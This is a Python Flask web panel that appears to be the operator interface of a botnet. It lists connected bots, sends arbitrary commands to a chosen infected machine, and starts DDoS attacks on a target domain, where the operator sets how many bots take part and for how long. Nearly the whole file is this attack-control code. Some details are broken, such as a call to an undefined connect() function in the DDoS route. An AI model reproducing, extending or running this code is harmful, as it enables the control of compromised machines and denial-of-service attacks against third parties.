#!/usr/bin/env python

from flask import Flask, flash, redirect, render_template, request, session, abort, url_for
from socket import error
from connection import getSock, recvTimeout
import socket
import os
import sys

app = Flask(__name__)
app.config['TESTING'] = True
errors = {'conn_err': 'Failed to connect to the server', 'ins_err': 'Check if ip and port are correct'}

@app.route('/')
def home():
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    else:
        return redirect(url_for('main_activity'))
 
@app.route('/login', methods=['GET','POST'])
def login():
    if request.method == 'POST':
        server_ip = request.form.get('server_ip')
        server_port = request.form.get('server_port')
        session['ip'] = server_ip
        session['port'] = int(server_port)
        if not server_ip or int(server_port) not in range(1,65535):
            return render_template('login.html', error = errors['ins_err'])
        try:
            sock = getSock(session)
            session['logged_in'] = True
            sock.close()
            return redirect(url_for('main_activity'))
        except socket.timeout as err:
            print('[DEBUG] Timeout error | reason: %s' %(err))
            return render_template('login.html', error = errors['conn_err'])
        except error as serr:
            return render_template('login.html', error = errors['conn_err'])

    if request.method == 'GET':
        return render_template('login.html')

#This is the main activity page, it gets all bots connected to the main server
@app.route('/main_activity', methods=['GET','POST'])
def main_activity():
    if request.method == 'POST':
        if request.form['submit'] == 'DDOS':
            return redirect(url_for('ddos_setup'))
        else:
            req = request.form.get('access')
            print('[DEBUG] ip selected: %s' %(req))
            return redirect(url_for('peer_activity', ip = req))
    
    if request.method == 'GET':
        if not session.get('logged_in'):
            return redirect(url_for('login'))
        else:
            try:
                sock = getSock(session) 
                sock.send("*".encode('utf-8'))
                ip_data = recvTimeout(sock, 0.5).split('*')
                session['cnt_peers'] = len(ip_data)
                print('[DEBUG] Bots connected %s' %str(ip_data), file=sys.stdout)
                sock.close()
                return render_template('main_activity.html', ip_list = ip_data)
            except socket.timeout as err:
                sock.close()
                return render_template('main_activity.html')
        
#User activity, get information from the bot you are connected
@app.route('/peer_activity/<ip>', methods=['GET','POST'])
def peer_activity(ip):
    if request.method == 'POST':
        if request.form['submit'] == 'Send':
            cmd = request.form.get('cmd_text')
            host = request.form.get("host")
            if cmd == '':
                return render_template('peer_activity.html', ip = ip)
            sock = getSock(session)
            srv_msg = "*".join(['CMD', host, cmd])
            sock.send(srv_msg.encode('utf-8'))
            print("[DEBUG] Message to server [%s] | PEER [%s]" %(srv_msg, host))
            resp = recvTimeout(sock)
            sock.close()
            #TODO Check  resp format
            if resp:
                print("[DEBUG] Response from Server: %s" %resp)
                return render_template('peer_activity.html', ip = ip, cmd_response = resp)
            else:
                return render_template('peer_activity.html', ip = ip)

        elif request.form['submit'] == 'Back':
            return redirect(url_for('main_activity'))

    elif request.method == 'GET':
        if session.get('logged_in') == True:
            return render_template('peer_activity.html', ip = ip)
        else:
            return redirect(url_for('login'))

#ddos_setup, setup for a ddos attack
@app.route('/ddos_setup', methods=['GET','POST'])
def ddos_setup():
    if request.method == 'POST':
        if request.form['submit'] == 'Start':
            n_peers = request.form.get('range')
            time = request.form.get('time')
            host = request.form.get('domain')
            if ('http' or 'https') in host:
                host = host.split('/')[2]
            msg = '*'.join(['DDOS', n_peers, time, host])
            sock = connect(session.get('ip'), session.get('port'))
            sock.send(msg.encode('utf-8'))
            sock.close()
            return render_template('ddos_setup.html', n_peers = session.get('cnt_peers'))
        elif request.form['submit'] == 'Back':
            return redirect(url_for('main_activity'))

    elif request.method == 'GET':
        if session.get('logged_in') == True:
            return render_template('ddos_setup.html', n_peers = session.get('cnt_peers'))
        else: 
            return redirect(url_for('login'))

if __name__ == "__main__":
    app.secret_key = os.urandom(12)
    app.debug=True
    app.testing=True
    app.run('0.0.0.0')
